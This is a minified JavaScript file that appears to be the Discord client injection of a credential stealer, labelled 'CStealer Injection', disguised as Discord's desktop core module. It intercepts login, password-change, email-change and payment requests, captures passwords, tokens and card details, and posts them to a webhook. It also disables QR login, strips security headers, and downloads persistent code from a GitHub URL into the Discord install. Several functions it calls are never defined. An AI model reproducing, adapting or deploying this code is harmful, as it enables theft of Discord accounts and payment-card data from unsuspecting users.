const args=process.argv,fs=require("fs"),path=require("path"),https=require("https"),querystring=require("querystring"),{BrowserWindow:BrowserWindow,session:session}=require("electron");function sleep(e){return new Promise((t=>setTimeout(t,e)))}const config={webhook:"%WEBHOOK%",auto_buy_nitro:!1,ping_on_run:!0,ping_val:"@everyone",embed_name:"CStealer Injection",embed_icon:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png".replace(/ /g,"%20"),embed_color:2895667,injection_url:"https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js",api:"https://discord.com/api/v9/users/@me",nitro:{boost:{year:{id:"521847234246082599",sku:"511651885459963904",price:"9999"},month:{id:"521847234246082599",sku:"511651880837840896",price:"999"}},classic:{month:{id:"521846918637420545",sku:"511651871736201216",price:"499"}}},filter:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts","https://api.stripe.com/v*/tokens","https://api.stripe.com/v*/setup_intents/*/confirm","https://api.stripe.com/v*/payment_intents/*/confirm"]},filter2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","wss://remote-auth-gateway.discord.gg/*"]}},[LOGOUT_SCRIPT]=['window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'],discordPath=function(){const e=args[0].split(path.sep).slice(0,-1).join(path.sep);let t;return"win32"===process.platform?t=path.join(e,"resources"):"darwin"===process.platform&&(t=path.join(e,"Contents","Resources")),fs.existsSync(t)?{resourcePath:t,app:e}:{undefined:void 0,undefined:void 0}}();async function updateCheck(){const{resourcePath:e,app:t}=discordPath;if(void 0===e||void 0===t)return;const n=path.join(e,"app"),a=path.join(n,"package.json"),r=path.join(n,"index.js"),o=path.join(e,"modules","discord_desktop_core-1","discord_desktop_core","index.js"),s=path.join(process.env.APPDATA,"\\betterdiscord\\data\\betterdiscord.asar");if(fs.existsSync(n)||fs.mkdirSync(n),fs.existsSync(a)&&fs.unlinkSync(a),fs.existsSync(r)&&fs.unlinkSync(r),"win32"===process.platform||"darwin"===process.platform){fs.writeFileSync(a,JSON.stringify({name:"discord",main:"index.js"},null,4));(async()=>await(BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`const fs=require("fs"),https=require("https"),path=require("path"),indexJs="${o}",bdPath="${s}",resourcePath="${e}",fileSize=fs.statSync(indexJs).size;async function init(){https.get("${config.injection_url}",(r=>{const e=fs.createWriteStream(indexJs);r.on("data",(r=>{const t=r.toString().replace("%WEBHOOK%","${config.webhook}");e.write(t)})),r.on("end",(()=>e.end()))})).on("error",(r=>{console.error("Error fetching data from URL:",r),setTimeout(init,1e4)}))}fs.readFile(indexJs,"utf8",((r,e)=>{if(r)return console.error("Error reading file:",r);(fileSize<2e4||"module.exports = require('./core.asar')"===e)&&init()}));try{require(path.join(resourcePath,"app.asar"))}catch(r){console.error("Error loading app.asar:",r)}if(fs.existsSync(bdPath))try{require(bdPath)}catch(r){console.error("Error loading bdPath:",r)}`)))().then((e=>{const t=String(e);fs.writeFileSync(r,t.replace(/\\/g,"\\\\"))}))}const i=path.join(__dirname,"initiation");return fs.existsSync(i)||(fs.mkdirSync(i),await sleep(3e3),wwww()),!1}const wwww=async()=>{await(BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT,!0))},getInfo=async e=>{const t=await(BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();\n  xmlHttp.open("GET", "${config.api}", false);\n  xmlHttp.setRequestHeader("Authorization", "${e}");\n  xmlHttp.send(null);\n  xmlHttp.responseText;`));return JSON.parse(t)},fetchBilling=async e=>{const t=await(BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false); \n    xmlHttp.setRequestHeader("Authorization", "${e}"); \n    xmlHttp.send(null); \n    xmlHttp.responseText`));return t.lenght&&0!==t.length?JSON.parse(t):""},getBilling=async e=>{const t=await fetchBilling(e);if(!t)return"❌";let n="";return t.forEach((e=>{if(!e.invalid)switch(e.type){case 1:n+="💳 ";break;case 2:n+="<:paypal:951139189389410365> "}})),n||(n="❌"),n},getNitro=e=>{switch(e){case 0:default:return"No Nitro";case 1:return"Nitro Classic";case 2:return"Nitro Boost"}},getBadges=e=>{let t="";switch(e){case 1:t+="Discord Staff, ";break;case 2:t+="Partnered Server Owner, ";break;case 131072:t+="Verified Bot Developer, ";break;case 4:t+="Hypesquad Event, ";break;case 16384:t+="Gold BugHunter, ";break;case 8:t+="Green BugHunter, ";break;case 512:t+="Early Supporter, ";break;case 128:t+="HypeSquad Brillance, ";break;case 64:t+="HypeSquad Bravery, ";break;case 256:t+="HypeSquad Balance, ";break;default:t="None"}return t},hooker=async e=>{const t=JSON.stringify(e),n=new URL(config.webhook);if(!config.webhook.includes("api/webhooks"))return void console.log("Invalid webhook URL");const a={protocol:n.protocol,hostname:n.host,path:n.pathname,method:"POST",headers:{"Content-Type":"application/json","Access-Control-Allow-Origin":"*"}},r=https.request(a,(e=>{console.log(`statusCode: ${e.statusCode}`),e.on("data",(e=>{process.stdout.write(e)}))}));r.on("error",(e=>{console.error(e)})),r.write(t),r.end()},login=async(e,t,n)=>{const a=await getInfo(n),r=getNitro(a.premium_type),o=getBadges(a.flags),s=await getBilling(n),i={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Account Info**",value:`Email: **${e}**`,inline:!1},{name:"**Password:**",value:`**${t}**`,inline:!1},{name:"**Token**",value:`\`${n}\``,inline:!1},{name:"Badges:",value:`**${o}**`,inline:!1},{name:"Nitro Type:",value:`**${r}**`,inline:!0},{name:"Billing:",value:`**${s}**`,inline:!0}],author:{name:`${a.username}#${a.discriminator} | ${a.id}`,icon_url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.webp`}}]};config.ping_on_run&&(i.content=config.ping_val),await hooker(i)},passwordChanged=async(e,t)=>{const n=await getInfo(t),a=getNitro(n.premium_type),r=getBadges(n.flags),o=await getBilling(t),s={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Password Changed**",value:`Email: **${n.email}**`,inline:!0},{name:"**New Password:**",value:`**${e}**`,inline:!1},{name:"**Token**",value:`\`${t}\``,inline:!1},{name:"Badges:",value:`**${r}**`,inline:!1},{name:"Nitro Type:",value:`**${a}**`,inline:!0},{name:"Billing:",value:`**${o}**`,inline:!0}],author:{name:`${n.username}#${n.discriminator} | ${n.id}`,icon_url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}.webp`}}]};config.ping_on_run&&(s.content=config.ping_val),await hooker(s)},emailChanged=async(e,t,n)=>{const a=await getInfo(n),r=getNitro(a.premium_type),o=getBadges(a.flags),s=await getBilling(n),i={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Email Changed**",value:`New Email: **${e}**`,inline:!0},{name:"**Password:**",value:`**${t}**`,inline:!1},{name:"**Token**",value:`\`${n}\``,inline:!1},{name:"Badges:",value:`**${o}**`,inline:!1},{name:"Nitro Type:",value:`**${r}**`,inline:!0},{name:"Billing:",value:`**${s}**`,inline:!0}],author:{name:`${a.username}#${a.discriminator} | ${a.id}`,icon_url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.webp`}}]};config.ping_on_run&&(i.content=config.ping_val),await hooker(i)},PaypalAdded=async e=>{const t=await getInfo(e),n=getNitro(t.premium_type),a=getBadges(t.flags),r=await getBilling(e),o={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Paypal Added**",value:"Okay but what now?",inline:!1},{name:"**Token**",value:`\`${e}\``,inline:!1},{name:"Badges:",value:`**${a}**`,inline:!1},{name:"Nitro Type:",value:`**${n}**`,inline:!0},{name:"Billing:",value:`**${r}**`,inline:!0}],author:{name:`${t.username}#${t.discriminator} | ${t.id}`,icon_url:`https://cdn.discordapp.com/avatars/${t.id}/${t.avatar}.webp`}}]};config.ping_on_run&&(o.content=config.ping_val),await hooker(o)};session.defaultSession.webRequest.onBeforeRequest(config.filter2,((e,t)=>{if(e.url.startsWith("wss://remote-auth-gateway"))return t({cancel:!0});updateCheck()})),session.defaultSession.webRequest.onHeadersReceived(((e,t)=>{e.url.startsWith(config.webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*","Access-Control-Allow-Origin":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(config.filter,(async(e,t)=>{if(200!==e.statusCode&&202!==e.statusCode)return;const n=Buffer.from(e.uploadData[0].bytes).toString(),a=JSON.parse(n),r=await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");switch(!0){case e.url.endsWith("login"):login(a.login,a.password,r).catch(console.error);break;case e.url.endsWith("users/@me")&&"PATCH"===e.method:if(!a.password)return;a.email&&emailChanged(a.email,a.password,r).catch(console.error),a.new_password&&passwordChanged(a.password,a.new_password).catch(console.error);break;case e.url.endsWith("tokens")&&"POST"===e.method:const t=querystring.parse(unparsedData.toString());ccAdded(t["card[number]"],t["card[cvc]"],t["card[exp_month]"],t["card[exp_year]"],r).catch(console.error);break;case e.url.endsWith("paypal_accounts")&&"POST"===e.method:PaypalAdded(r).catch(console.error);break;case e.url.endsWith("confirm")&&"POST"===e.method:if(!config.auto_buy_nitro)return;setTimeout((()=>{nitroBought(r).catch(console.error)}),7500)}})),module.exports=require("./core.asar");
